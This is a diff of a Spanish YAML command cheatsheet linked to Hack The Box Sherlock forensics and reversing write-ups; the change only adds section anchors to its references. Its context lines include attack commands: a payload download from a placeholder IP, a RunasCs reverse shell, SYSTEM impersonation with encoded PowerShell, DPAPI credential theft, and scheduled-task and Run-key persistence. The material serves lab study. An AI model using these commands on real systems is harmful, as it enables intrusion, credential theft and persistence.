@@ -5,8 +5,14 @@
 #   fase:  la actividad / fase (mira la lista de abajo para reutilizar nombres)
 #   desc:  qué hace, en una frase
 #   tags:  palabras clave para el buscador
-#   refs:  dónde lo usaste (lista; cada uno con nombre + url al writeup).
-#          Déjalo vacío con []  si aún no lo has usado en un writeup publicado.
+#   refs:  dónde lo usaste (lista). Cada referencia:
+#            nombre:  el lab/máquina/sherlock/CTF
+#            url:     enlace al writeup; añade #ancla-de-la-seccion para caer en el punto exacto
+#            seccion: etiqueta corta de la parte donde lo usaste (ej. "Tarea 8 · Movimiento lateral")
+#          Déjalo en  []  si aún no lo has usado en un writeup publicado.
+#
+# Para saber el #ancla de una sección: abre el writeup, pasa el cursor por el título
+# de la sección y copia el enlace (#...), o mira el id del encabezado.
 #
 # Fases sugeridas (para que los filtros no se multipliquen):
 #   Reconocimiento, Enumeración, Acceso inicial, Transferencia de archivos,
@@ -37,7 +43,8 @@
   tags: [lolbin, certutil, windows, download]
   refs:
     - nombre: "HTB: ShadowBait"
-      url: /posts/htb-sherlock-shadowbait/
+      url: "/posts/htb-sherlock-shadowbait/#8-descarga-de-la-herramienta-de-movimiento-lateral"
+      seccion: "Tarea 8 · Descarga de RunasCs"
 
 - cmd: 'Invoke-WebRequest http://<IP>/opendll.exe -OutFile C:\Users\<user>\AppData\Roaming\opendll.exe'
   fase: Transferencia de archivos
@@ -45,7 +52,8 @@
   tags: [powershell, download]
   refs:
     - nombre: "HTB: ShadowBait"
-      url: /posts/htb-sherlock-shadowbait/
+      url: "/posts/htb-sherlock-shadowbait/#4-payload-final-de-acceso-remoto"
+      seccion: "Tarea 4 · Payload de acceso remoto"
 
 - cmd: '$cred = Import-Clixml -Path connection.xml'
   fase: Credenciales
@@ -53,7 +61,8 @@
   tags: [dpapi, powershell, credentials, windows]
   refs:
     - nombre: "HTB: ShadowBait"
-      url: /posts/htb-sherlock-shadowbait/
+      url: "/posts/htb-sherlock-shadowbait/#7-comando-para-robar-las-credenciales-de-samy"
+      seccion: "Tarea 7 · Robo de credenciales (DPAPI)"
 
 - cmd: '$cred | Export-Clixml -Path C:\Users\<user>\Documents\connection.xml'
   fase: Credenciales
@@ -61,7 +70,8 @@
   tags: [dpapi, powershell, credentials]
   refs:
     - nombre: "HTB: ShadowBait"
-      url: /posts/htb-sherlock-shadowbait/
+      url: "/posts/htb-sherlock-shadowbait/#6-archivo-abusado-v%C3%ADa-dpapi"
+      seccion: "Tarea 6 · Archivo DPAPI (connection.xml)"
 
 - cmd: 'RunasCs.exe <usuario> <password> cmd.exe -r <IP>:<puerto>'
   fase: Movimiento lateral
@@ -69,7 +79,8 @@
   tags: [runascs, lateral-movement, windows]
   refs:
     - nombre: "HTB: ShadowBait"
-      url: /posts/htb-sherlock-shadowbait/
+      url: "/posts/htb-sherlock-shadowbait/#9-contrase%C3%B1a-de-samy"
+      seccion: "Tarea 9 · Shell como Samy"
 
 - cmd: 'ImpersonateFromParentPid -ppid <PID_SYSTEM> -command "c:\windows\system32\cmd.exe" -cmdargs "/c powershell -e <b64>"'
   fase: Escalada de privilegios
@@ -77,7 +88,8 @@
   tags: [parent-pid-spoofing, psgetsys, privesc, windows]
   refs:
     - nombre: "HTB: ShadowBait"
-      url: /posts/htb-sherlock-shadowbait/
+      url: "/posts/htb-sherlock-shadowbait/#11-proceso-explotado-para-elevar-privilegios"
+      seccion: "Tarea 11 · Parent PID Spoofing"
 
 - cmd: 'schtasks /create /tn "Updater" /tr C:\Windows\system32\document.pdf.exe /sc onlogon /ru SYSTEM'
   fase: Persistencia
@@ -85,7 +97,8 @@
   tags: [schtasks, persistence, windows]
   refs:
     - nombre: "HTB: ShadowBait"
-      url: /posts/htb-sherlock-shadowbait/
+      url: "/posts/htb-sherlock-shadowbait/#13-backdoor-con-persistencia"
+      seccion: "Tarea 13 · Persistencia"
 
 - cmd: 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Windows\system32\document.pdf.exe /f'
   fase: Persistencia
@@ -93,7 +106,8 @@
   tags: [registry, run-key, persistence, windows]
   refs:
     - nombre: "HTB: ShadowBait"
-      url: /posts/htb-sherlock-shadowbait/
+      url: "/posts/htb-sherlock-shadowbait/#13-backdoor-con-persistencia"
+      seccion: "Tarea 13 · Persistencia"
 
 - cmd: 'DB Browser for SQLite -> tabla "downloads" en Default\History (Chrome)'
   fase: Análisis / DFIR
@@ -101,7 +115,8 @@
   tags: [dfir, chrome, sqlite, forensics]
   refs:
     - nombre: "HTB: ShadowBait"
-      url: /posts/htb-sherlock-shadowbait/
+      url: "/posts/htb-sherlock-shadowbait/#1-documento-malicioso-del-phishing"
+      seccion: "Tarea 1 · Historial de Chrome"
 
 - cmd: 'Timeline Explorer -> filtrar Parent Path en mft.csv'
   fase: Análisis / DFIR
@@ -109,7 +124,8 @@
   tags: [dfir, mft, timeline-explorer, forensics]
   refs:
     - nombre: "HTB: ShadowBait"
-      url: /posts/htb-sherlock-shadowbait/
+      url: "/posts/htb-sherlock-shadowbait/#3-descarga-del-stager"
+      seccion: "Tarea 3 · MFT / stager"
 
 - cmd: 'Sysmon: Event ID 1 (proceso), 3 (red), 11 (creación de archivo)'
   fase: Análisis / DFIR
@@ -117,7 +133,8 @@
   tags: [dfir, sysmon, evtx, forensics]
   refs:
     - nombre: "HTB: ShadowBait"
-      url: /posts/htb-sherlock-shadowbait/
+      url: "/posts/htb-sherlock-shadowbait/#5-puerto-de-c2"
+      seccion: "Tarea 5 · Sysmon (red)"
 
 # ----------------------- SneakyKeys (Reversing) -----------------------
 
@@ -127,7 +144,8 @@
   tags: [reversing, ghidra, chacha20, crypto]
   refs:
     - nombre: "HTB: SneakyKeys"
-      url: /posts/htb-sherlock-sneakykeys/
+      url: "/posts/htb-sherlock-sneakykeys/#1-algoritmo-de-cifrado"
+      seccion: "Tarea 1 · Algoritmo (ChaCha20)"
 
 - cmd: 'htons(0x1A29) -> 6697 (Ghidra / WS2_32)'
   fase: Reversing
@@ -135,7 +153,8 @@
   tags: [reversing, ghidra, ws2_32, irc, c2]
   refs:
     - nombre: "HTB: SneakyKeys"
-      url: /posts/htb-sherlock-sneakykeys/
+      url: "/posts/htb-sherlock-sneakykeys/#3-protocolo-de-c2"
+      seccion: "Tarea 3 · Protocolo C2 (IRC)"
 
 - cmd: 'SHGetFolderPathA(CSIDL=7) -> carpeta Startup'
   fase: Reversing
@@ -143,7 +162,8 @@
   tags: [reversing, persistence, csidl, windows]
   refs:
     - nombre: "HTB: SneakyKeys"
-      url: /posts/htb-sherlock-sneakykeys/
+      url: "/posts/htb-sherlock-sneakykeys/#2-directorio-de-la-copia-duplicada"
+      seccion: "Tarea 2 · Persistencia (Startup)"
 
 - cmd: 'descifrar_chacha20(key_hex, nonce_hex, ciphertext_hex)'
   fase: Cripto
@@ -151,4 +171,5 @@
   tags: [crypto, chacha20, python]
   refs:
     - nombre: "HTB: SneakyKeys"
-      url: /posts/htb-sherlock-sneakykeys/
+      url: "/posts/htb-sherlock-sneakykeys/#5-aplicaci%C3%B3n-objetivo"
+      seccion: "Tarea 5 · App objetivo (descifrado)"
